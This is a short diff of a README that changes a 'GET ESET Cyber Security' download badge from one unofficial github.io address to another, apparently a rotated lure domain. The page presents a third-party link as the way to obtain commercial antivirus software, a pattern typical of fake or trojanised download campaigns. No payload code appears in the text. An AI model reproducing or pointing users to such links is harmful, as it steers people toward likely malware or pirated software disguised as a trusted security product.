@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://tubus-jubus-apps.github.io/.github/eset-cyber-security">  
+<a href="https://top-ssilka-apps.github.io/.github/eset-cyber-security">  
 <img src="https://img.shields.io/badge/💻_GET_ESET_Cyber_Security-blue?style=for-the-badge&logo=apple" alt="GET ESET Cyber Security">  
 </a>  
 </div>
